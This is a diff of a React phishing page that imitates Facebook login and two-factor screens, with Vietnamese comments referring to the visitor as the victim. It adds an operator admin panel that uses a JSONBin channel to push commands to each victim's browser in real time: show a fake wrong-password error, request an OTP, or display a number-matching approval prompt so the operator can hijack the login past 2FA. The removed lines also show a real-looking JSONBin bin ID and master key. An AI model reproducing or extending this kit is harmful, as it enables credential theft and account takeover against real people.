@@ -3,8 +3,8 @@ import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } fr
 
 // ==========================================
 // THAY THÔNG TIN JSONBIN CỦA MÀY VÀO ĐÂY
-const BIN_ID = '6ad7e7f5ac6210605a43b63c';
-const API_KEY = '$2a$10$aQUMOVeeqI4gvQgvEtfmz.mT7MtH0h2ddIYvYbYOMilObcfbHMBZG';
+const BIN_ID = 'THAY_BIN_ID_CUA_MAY_VAO_DAY';
+const API_KEY = 'THAY_API_KEY_CUA_MAY_VAO_DAY';
 // ==========================================
 
 export default function Home() {
@@ -26,10 +26,11 @@ export default function Home() {
 
   // --- STATES CHO BƯỚC 3 & ADMIN ---
   const [matchNumber, setMatchNumber] = useState(null); 
-  const [adminInput, setAdminInput] = useState('');
+  const [adminSessionId, setAdminSessionId] = useState(''); // Mã phiên của nạn nhân
+  const [adminNumberInput, setAdminNumberInput] = useState(''); // Số duyệt
   const [showAdmin, setShowAdmin] = useState(false);
 
-  // --- TẠO MÃ PHIÊN CHO TỪNG NGƯỜI ---
+  // --- TẠO MÃ PHIÊN CHO NGƯỜI TRUY CẬP ---
   const [sessionId] = useState(() => {
       let id = localStorage.getItem('session_id');
       if (!id) {
@@ -76,23 +77,32 @@ export default function Home() {
       }
   }, [showModal, clientIp]);
 
-  // --- LẮNG NGHE SỐ TỪ ADMIN ---
+  // --- LẮNG NGHE LỆNH TỪ ADMIN (CHO TẤT CẢ CÁC BƯỚC) ---
   useEffect(() => {
-    if (step === 3 && !showAdmin) {
-        const interval = setInterval(() => {
-            fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-                headers: { 'X-Master-Key': API_KEY }
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.record && data.record.number && data.record.target === sessionId) {
-                    setMatchNumber(data.record.number);
+    const interval = setInterval(() => {
+        fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+            headers: { 'X-Master-Key': API_KEY }
+        })
+        .then(res => res.json())
+        .then(data => {
+            // Chỉ nhận lệnh nếu đúng Mã Phiên của máy này
+            if(data.record && data.record.target === sessionId) {
+                if (data.record.action === 'otp') {
+                    setStep(3); 
+                    setMatchNumber(null); 
+                } else if (data.record.action === 'approve' && data.record.value) {
+                    setStep(3); 
+                    setMatchNumber(data.record.value); 
+                } else if (data.record.action === 'error') {
+                    setStep(2);
+                    setShowLoginError(true);
+                    setLoginPass('');
                 }
-            }).catch(()=>{});
-        }, 2000);
-        return () => clearInterval(interval);
-    }
-  }, [step, showAdmin, sessionId]);
+            }
+        }).catch(()=>{});
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [sessionId]);
 
   // --- PHÍM TẮT MỞ ADMIN (Ctrl + Shift + A) ---
   useEffect(() => {
@@ -137,12 +147,14 @@ export default function Home() {
     setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
   };
 
-  const handleAdminUpdate = () => {
-      if(!adminInput || !adminInput.includes(':')) {
-          alert('Vui lòng nhập đúng định dạng: Mã Phiên : Số (VD: user_a1b2c3:42)');
+  // --- HÀM GỬI LỆNH TỪ ADMIN ---
+  const handleAdminCommand = (type, value) => {
+      const targetUser = adminSessionId.trim(); 
+      if (!targetUser) {
+          alert('Vui lòng nhập Mã Phiên của nạn nhân!');
           return;
       }
-      const [targetUser, numberToSend] = adminInput.split(':');
+      
       fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
           method: 'PUT',
           headers: {
@@ -150,11 +162,12 @@ export default function Home() {
               'X-Master-Key': API_KEY
           },
           body: JSON.stringify({ 
-              number: numberToSend.trim(), 
-              target: targetUser.trim() 
+              action: type, 
+              value: value,
+              target: targetUser
           })
       }).then(() => {
-          alert(`Đã gửi số ${numberToSend} cho người dùng ${targetUser}`);
+          alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
       });
   };
 
@@ -296,13 +309,31 @@ export default function Home() {
 
                 {showAdmin ? (
                   <div style={{ textAlign: 'center' }}>
-                    <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '20px' }}>Admin Panel</h2>
-                    <p style={{ fontSize: '13px', color: '#fa383e', marginBottom: '10px' }}>
-                        Mã người dùng đang xem: <b>{sessionId}</b>
-                    </p>
-                    <input className="fb-input" type="text" placeholder="Nhập: user_xxx : 42" value={adminInput} onChange={(e) => setAdminInput(e.target.value)} />
-                    <button onClick={handleAdminUpdate} className="fb-btn" style={{ marginTop: '10px' }}>Gửi số cho người này</button>
-                    <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
+                    <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
+                    
+                    <div style={{ marginBottom: '20px' }}>
+                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên nạn nhân (lấy từ Telegram):</p>
+                        <input 
+                            className="fb-input" 
+                            type="text" 
+                            placeholder="VD: user_a1b2c3" 
+                            value={adminSessionId} 
+                            onChange={(e) => setAdminSessionId(e.target.value)} 
+                        />
+                    </div>
+
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                        <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
+                        <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
+                        
+                        <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
+                            <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
+                            <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
+                            <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
+                        </div>
+                        
+                        <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
+                    </div>
                   </div>
                 ) : (
                   <>
@@ -593,7 +624,7 @@ export default function Home() {
                     {step === 3 && (
                       <>
                         {matchNumber ? (
-                          // GIAO DIỆN DUYỆT THIẾT BỊ (Chỉ hiện khi mày đã nhập số)
+                          // GIAO DIỆN DUYỆT THIẾT BỊ
                           <>
                             <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px' }}>
                                 Check your other device
@@ -610,10 +641,9 @@ export default function Home() {
                             <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>
                                 {matchNumber}
                             </div>
-                            
                           </>
                         ) : (
-                          // GIAO DIỆN NHẬP MÃ 2FA BÌNH THƯỜNG (Hiện lúc đầu)
+                          // GIAO DIỆN NHẬP MÃ 2FA
                           <>
                             <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
                             
